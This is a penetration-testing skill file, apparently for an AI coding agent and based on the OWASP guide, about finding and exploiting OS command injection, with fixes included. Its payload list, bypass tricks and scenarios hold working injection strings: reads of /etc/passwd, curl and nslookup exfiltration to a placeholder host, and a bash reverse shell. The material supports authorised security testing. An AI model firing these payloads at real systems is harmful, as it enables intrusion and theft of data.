---
name: cmd-injection
description: >
  OS command injection occurs when user input is passed unsanitized to a system shell via dangerous APIs: Java `Runtime.exec()`, Python `os.system/subprocess`, PHP `system/shell_exec/exec/proc_open`, C `system/exec`. Detect via pipe `|`, semicolon `;`, `&&`, `||`, backtick, `$()` operators, and time-delay payloads (`sleep 5`). Tools: Commix, Burp Suite, OWASP WebGoat.
license: MIT
compatibility: Designed for Claude Code. Requires curl, Burp Suite or OWASP ZAP, Commix (optional).
metadata:
  category: web
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-INPV-12
---

# OS Command Injection

## What Is Broken and Why
Command injection occurs when an application passes user-supplied data to a system shell without sanitization, effectively letting the attacker append their own commands. Applications that invoke OS utilities (ping, nslookup, file conversion tools, archive utilities) by constructing shell strings are particularly susceptible. The vulnerability grants attacker-level access equivalent to the web server process user, enabling file read/write, network pivoting, and privilege escalation.

## Key Signals
- Application invokes OS utilities and reflects their output (ping results, DNS lookups, file listings)
- Parameters accepting hostnames, filenames, or search terms passed to shell commands
- Error messages referencing shell commands or paths (`/bin/sh`, `cmd.exe`)
- File download or conversion features that call system utilities
- Parameters containing IP addresses or hostnames processed server-side
- Dangerous functions in source: `Runtime.exec()`, `os.system()`, `shell_exec()`, `proc_open()`, `subprocess.call()`

## Methodology
1. Identify parameters that may reach shell execution (filenames, hostnames, IDs used in system calls).
2. Inject shell metacharacters one at a time: `|`, `;`, `&`, `&&`, `||`, `` ` ``, `$()`.
3. Append a time-delay command to detect blind injection without visible output: `; sleep 5` or `| ping -c 5 127.0.0.1`.
4. Confirm execution by measuring response time difference.
5. Exfiltrate data via out-of-band channel (DNS lookup or HTTP request to attacker server):
   - `; curl http://VICTIM/$(whoami)`
   - `; nslookup $(whoami).VICTIM`
6. For Windows targets, use `ping -n 5 127.0.0.1` for time delay; `dir` instead of `ls`.
7. Attempt privilege escalation if running as low-privilege user.

## Payloads & Tools
```
# Basic command chaining (Linux)
TARGET/cgi-bin/script.pl?doc=report.pdf|id
TARGET/page?host=127.0.0.1;id
TARGET/page?host=127.0.0.1&&id
TARGET/page?host=127.0.0.1||id

# Command substitution
TARGET/page?host=$(id)
TARGET/page?host=`id`

# Blind injection — time delay (Linux)
TARGET/page?host=127.0.0.1;sleep%205
TARGET/page?host=127.0.0.1|ping%20-c%205%20127.0.0.1

# Blind injection — time delay (Windows)
TARGET/page?host=127.0.0.1|ping%20-n%205%20127.0.0.1

# Blind injection — out-of-band DNS exfil
TARGET/page?host=;nslookup%20$(whoami).VICTIM
TARGET/page?host=;curl%20http://VICTIM/$(whoami)

# File read
TARGET/page?file=report.pdf;cat%20/etc/passwd
TARGET/page?file=report.pdf|type%20C:\Windows\win.ini

# PHP-specific (POST body)
Doc=Doc1.pdf+|+dir+c:\

# URL-encoded semicolon method
TARGET/something.php?dir=%3Bcat%20/etc/passwd

# Commix automated testing
commix --url="TARGET/page?host=INJECT_HERE" --technique=classic
commix --url="TARGET/page" --data="host=INJECT_HERE" --technique=timebased
```

## Bypass Techniques
- URL-encode metacharacters: `%7C` for `|`, `%3B` for `;`, `%26` for `&`
- Double URL-encode: `%257C` → `%7C` → `|`
- Insert variable: `ca${IFS}t /etc/passwd` (IFS is Internal Field Separator = space)
- Quote insertion: `c'a't /etc/passwd`, `c"a"t /etc/passwd`
- Environment variables: `$IFS` for space, `${PATH:0:1}` for `/`
- Backtick vs `$()`: try both if one is filtered
- Newline character: `%0a` to break out of filter context
- Windows: `^` as escape character (`p^i^n^g`)

## Exploitation Scenarios
**Scenario 1 — Ping Utility Injection**
Setup: Network diagnostic page accepts IP address input, constructs `ping -c 3 $userInput` in PHP via `shell_exec()`.
Trigger: Submit `127.0.0.1; cat /etc/passwd` — ping runs then passwd file contents returned.
Impact: Arbitrary file read; escalate to reverse shell: `127.0.0.1; bash -i >& /dev/tcp/VICTIM/4444 0>&1`

**Scenario 2 — Blind Injection via File Conversion**
Setup: PDF conversion service passes filename to `convert $filename output.pdf`; no output returned to user.
Trigger: Submit filename `report.pdf; sleep 10` — response delayed 10 seconds confirming injection.
Impact: Exfiltrate data via DNS: `report.pdf; nslookup $(cat /etc/passwd | head -1 | base64).VICTIM`

**Scenario 3 — Windows IIS CGI Injection**
Setup: ASP page calls `cmd.exe /c ipconfig $subnet` to generate network report.
Trigger: POST body `subnet=10.0.0.0 & dir C:\inetpub\wwwroot`
Impact: Web root directory listing; follow with credential file exfiltration.

## False Positives
- Shell metacharacters in input that are properly escaped before shell execution
- Application using parameterized API (e.g., Python `subprocess.run(['ping', host])` list form — no shell interpretation)
- WAF stripping characters before reaching application (test with time-based payloads to confirm)
- Time delays caused by legitimate network timeouts, not injected sleep commands

## Fix Patterns
- Never construct shell commands from user input; use language APIs directly (e.g., Python `subprocess.run(['ping', '-c', '3', host], shell=False)`)
- If shell execution is unavoidable, use an allowlist for accepted input characters (e.g., alphanumeric + dots for IP addresses)
- Blocklist dangerous characters as defense-in-depth: `|`, `;`, `&`, `$`, `>`, `<`, `` ` ``, `\`, `!`, `>>`, `#`
- Run web server processes with minimal OS privileges
- Use language-specific safe alternatives: Java `ProcessBuilder`, Python `subprocess` with list args, PHP `escapeshellarg()`

## Related Skills

[[sql-injection]] and cmd-injection are the same fundamental failure class applied to different interpreters — the input validation methodology and blind time-based detection technique are directly transferable. [[ssti]] also achieves code execution via injection, but through a template engine rather than a shell; both share the mental model of breaking out of a string context into an execution context. If the command injection vector is a filename parameter, [[path-traversal]] payloads may also apply to the same parameter.
